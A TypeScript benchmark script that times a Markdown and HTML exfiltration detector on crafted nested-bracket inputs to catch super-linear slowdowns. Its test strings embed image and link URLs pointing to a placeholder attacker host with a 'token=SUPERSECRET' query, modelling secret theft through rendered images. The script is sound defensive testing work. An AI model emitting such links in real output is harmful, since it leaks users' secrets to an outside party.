// T77 — the shapes T77's OWN change makes newly reachable, scaled.
//
// T72-perf.ts and T72-perf2.ts (unmodified) answer "did the reviewer's shapes
// get better". They cannot answer "did the repair open a new one", and it
// could have: closing T72#F-001 means an opening bracket inside a LINK's
// description is no longer skipped, so a construct that used to cost one regex
// exec can now be offered one per bracket. Every shape below is built to make
// that happen, plus the label and destination grammars driven from both ends.
//
// Growth exponent per doubling: ~1 is linear, ~2 quadratic, ~3 cubic.
// Read-only, offline, synthetic hosts only. Usage: bun T77-perf.ts [out.json]
import { detectExfil } from "../../../../src/security/detect/exfil";

const U = "https://attacker.invalid/p?ctx=CTX";
const SECRET = "https://attacker.invalid/p?token=SUPERSECRET";
const BUDGET_MS = 8000;

const shapes: Record<string, (n: number) => string> = {
  // --- many opens sharing ONE description end, all reaching the same `)` ----
  // Before T77 the first open skipped the rest; now every open is examined, so
  // the destination reading has to be memoised by description end or this is
  // quadratic.
  sharedDestination: (n) => "[".repeat(n) + "](" + "A".repeat(n) + ")",
  sharedDestinationImage: (n) => "![".repeat(n) + "](" + "A".repeat(n) + ")",
  // the same, but the destination carries a credential locator so the LINK
  // branch classifies rather than dropping out early
  sharedSensitiveDestination: (n) => "[".repeat(n) + "](" + SECRET + "?p=" + "A".repeat(n) + ")",

  // --- many DISTINCT description ends all reaching one far `)` -------------
  // The destination-skip region is what keeps this linear: the first link's
  // destination covers every later open.
  emptyDescriptionRun: (n) => "[](".repeat(Math.floor(n / 3)) + ")",
  emptyImageDescriptionRun: (n) => "![](".repeat(Math.floor(n / 4)) + ")",
  bracketParenAlternating: (n) => "[]()".repeat(Math.floor(n / 4)),

  // --- the badge idiom itself, repeated ------------------------------------
  badgeIdiomRun: (n) => `[![b](${U})](https://ci.example.com/j)`.repeat(Math.max(1, Math.floor(n / 60))),
  nestedLinkDepth: (n) => "[".repeat(Math.floor(n / 2)) + `![b](${U})` + "](x)".repeat(Math.floor(n / 8)),

  // --- the label grammar, driven from both ends ----------------------------
  // A definition IS present, so the reference pass runs and every bracket run
  // is a candidate label.
  labelRunWithDefinition: (n) =>
    "![".repeat(Math.floor(n / 2)) + "]\n\n[a]: " + U + "\n",
  longLabelWithMatchingDefinition: (n) =>
    `![a][${"L".repeat(n)}]\n\n[${"L".repeat(n)}]: ${U}\n`,
  // whitespace-inflated labels: the non-whitespace prefix count is what keeps
  // this from being sliced once per bracket
  whitespaceInflatedLabels: (n) =>
    "![".repeat(Math.floor(n / 4)) + " ".repeat(Math.floor(n / 2)) + "a]\n\n[a]: " + U + "\n",
  manyDefinitions: (n) =>
    Array.from({ length: Math.max(1, Math.floor(n / 40)) }, (_, i) => `[r${i}]: ${U}\n`).join("") +
    "![r0]\n",

  // --- parens without brackets and brackets without parens ------------------
  parenRun: (n) => "()".repeat(Math.floor(n / 2)),
  openParenRun: (n) => "(".repeat(n),
  closeBracketOpenParen: (n) => "](".repeat(Math.floor(n / 2)),

  // --- controls: the HTML half must not have moved -------------------------
  htmlSrcsetRun: (n) => `<img srcset="https://cdn.example.org/a.png 1x, https://cdn.example.org/b.png 2x">`.repeat(Math.max(1, Math.floor(n / 75))),
  htmlCharrefSrcsetRun: (n) => `<img srcset="https://cdn.example.org/a.png&#44;${U} 2x">`.repeat(Math.max(1, Math.floor(n / 70))),
};

type Row = {
  id: string;
  sizes: { n: number; bytes: number; ms: number; findings: number }[];
  exponent: number | null;
  worstMs: number;
  note: string;
};

const rows: Row[] = [];
for (const [id, build] of Object.entries(shapes)) {
  const sizes: { n: number; bytes: number; ms: number; findings: number }[] = [];
  for (const n of [12500, 25000, 50000, 100000, 200000]) {
    const text = build(n);
    const started = performance.now();
    const findings = detectExfil(text, []);
    const ms = performance.now() - started;
    sizes.push({
      n,
      bytes: text.length,
      ms: Math.round(ms * 10) / 10,
      findings: findings.length,
    });
    if (ms > BUDGET_MS) break;
  }
  let exponent: number | null = null;
  if (sizes.length >= 2) {
    const a = sizes[sizes.length - 2] as { bytes: number; ms: number };
    const b = sizes[sizes.length - 1] as { bytes: number; ms: number };
    if (a.ms > 0.5 && b.bytes > a.bytes) {
      exponent =
        Math.round((Math.log(b.ms / a.ms) / Math.log(b.bytes / a.bytes)) * 100) / 100;
    }
  }
  rows.push({
    id,
    sizes,
    exponent,
    worstMs: Math.max(...sizes.map((s) => s.ms)),
    note: sizes.length < 5 ? `stopped early: exceeded ${BUDGET_MS} ms budget` : "",
  });
}

for (const r of rows) {
  console.log(
    `${r.id.padEnd(32)} worst=${String(r.worstMs).padStart(9)} ms exponent=${String(r.exponent).padStart(6)} sizes=${JSON.stringify(r.sizes)} ${r.note}`,
  );
}

const summary = {
  shapes: rows.length,
  worstShape: rows.reduce((a, b) => (a.worstMs >= b.worstMs ? a : b)).id,
  worstMs: Math.max(...rows.map((r) => r.worstMs)),
  shapesOverOneSecond: rows.filter((r) => r.worstMs > 1000).map((r) => `${r.id}=${r.worstMs}ms`),
  superLinearShapes: rows
    .filter((r) => (r.exponent ?? 0) > 1.5)
    .map((r) => `${r.id}(exp=${r.exponent}, worst=${r.worstMs}ms)`),
};
console.log(JSON.stringify(summary, null, 2));

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ summary, rows }, null, 2));
